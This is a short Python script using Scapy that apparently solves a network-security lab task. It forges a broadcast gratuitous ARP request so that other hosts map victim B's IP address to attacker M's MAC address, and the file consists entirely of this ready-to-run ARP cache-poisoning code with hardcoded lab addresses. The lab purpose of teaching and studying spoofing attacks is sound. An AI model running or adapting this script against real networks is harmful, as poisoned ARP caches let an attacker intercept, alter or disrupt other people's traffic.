#!/usr/bin/env python3
from scapy.all import *
"""ARP gratuitous packet is a special ARP request packet. It is used when a host 
   machine needs to update outdated information on all the other machine’s ARP cache. 
   
   On host M, construct an ARP gratuitous packet, and use
   it to map B’s IP address to M’s MAC address."""
   
# To make ARP reply OK for A-machine,
# it ARP table should already contain record with B ip 
   
A_IP = "10.9.0.5"
A_MAC = "02:42:0a:09:00:05"
B_IP = "10.9.0.6"
M_MAC = "02:42:0a:09:00:69"

print("SENDING SPOOFED ARP GRATUITOUS MESSAGE...")

ether = Ether()
ether.dst = "ff:ff:ff:ff:ff:ff"
ether.src = M_MAC

arp = ARP()
arp.psrc = B_IP
arp.hwsrc = M_MAC
arp.pdst = B_IP
arp.hwdst = "ff:ff:ff:ff:ff:ff"
arp.op = 1 

frame = ether/arp
sendp(frame)
